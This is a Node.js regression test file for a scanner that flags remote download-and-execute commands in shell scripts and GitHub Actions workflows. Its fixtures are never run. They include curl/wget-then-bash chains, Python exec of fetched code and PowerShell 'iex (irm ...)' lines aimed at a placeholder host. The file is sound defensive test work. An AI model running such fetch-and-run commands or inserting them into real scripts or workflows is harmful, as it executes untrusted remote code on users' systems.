'use strict';
// Independent Codex P1 round-3 regressions. No fixture commands are executed.
const test=require('node:test');
const assert=require('node:assert/strict');
const {findingsForScript}=require('./ultra_sentinel_advanced_execution.cjs');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const U='https://example.invalid/remote';
const positive=[
 ['curl-options-bundled',"curl -fsSLo payload "+U+"; bash payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['curl-options-bundled-joined',"curl -fsSLopayload "+U+"; bash payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['wget-output-bundled',"wget -qO payload "+U+"; sh payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['copy-with-quoted-destination',"curl -fsSL "+U+" -o payload; cp payload 'run.sh'; bash run.sh",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['link-with-two-quoted-operands',"curl -fsSL "+U+" -o payload; ln 'payload' \"run.sh\"; bash run.sh",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['move-with-quoted-arguments',"curl -fsSL "+U+" -o payload; mv -f 'payload' 'run.sh'; bash run.sh",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['python-unbuffered-before-c',"python -u -c 'import urllib.request\nexec(urllib.request.urlopen(\""+U+"\").read())'",'REMOTE_INTERPRETER_FETCH_EXECUTION'],
 ['python-isolated-before-c',"python3 -I -B -c 'import urllib.request\nexec(urllib.request.urlopen(\""+U+"\").read())'",'REMOTE_INTERPRETER_FETCH_EXECUTION'],
 ['python-verbose-before-c',"python -u -B -c 'import urllib.request\nexec(urllib.request.urlopen(\""+U+"\").read())'",'REMOTE_INTERPRETER_FETCH_EXECUTION'],
 ['powershell-irm-direct',"iex (irm "+U+")",'REMOTE_POWERSHELL_EXECUTION','pwsh'],
 ['powershell-invoke-rest-method',"Invoke-Expression (Invoke-RestMethod '"+U+"')",'REMOTE_POWERSHELL_EXECUTION','pwsh'],
 ['powershell-irm-explicit',"pwsh -Command \"iex (irm "+U+")\"",'REMOTE_POWERSHELL_EXECUTION']
];
function workflow(source,shell){
 return ['on: issues','permissions: read-all','jobs:','  audit:',
 '    runs-on: ubuntu-latest','    steps:','      - run: |',
 ...source.split('\n').map(line=>'          '+line),
 ...(shell?['        shell: '+shell]:[])].join('\n')+'\n';
}
for(const [name,src,rule,shell] of positive){
 test('Codex round-3 '+name+' detected by scanner and YAML audit',()=>{
  const found=findingsForScript(src,{shell});
  assert.ok(found.includes(rule),name+' scanner '+JSON.stringify(found));
  const audit=inspectWorkflow(workflow(src,shell),{path:'.github/workflows/round3.yml'});
  assert.ok(audit.findings.some(x=>x.rule===rule&&x.severity==='HIGH'),
   name+' structural '+JSON.stringify(audit));
 });
}
const negative=[
 ['curl-bundle-without-execution',"curl -fsSLo payload "+U],
 ['quoted-copy-without-execution',"curl -fsSL "+U+" -o payload; cp payload 'report.txt'"],
 ['python-options-without-eval',"python -u -c 'import urllib.request\nprint(urllib.request.urlopen(\""+U+"\").read())'"],
 ['powershell-rest-only',"irm "+U,'pwsh'],
 ['powershell-web-request-object-only',"iex (iwr "+U+")",'pwsh'],
 ['powershell-string-literal',"Write-Host \"iex (irm "+U+")\"",'pwsh']
];
for(const [name,src,shell] of negative){
 test('Codex round-3 benign '+name+' remains unflagged',()=>{
  const found=findingsForScript(src,{shell});
  assert.ok(!found.some(x=>x.startsWith('REMOTE_')),name+': '+JSON.stringify(found));
 });
}
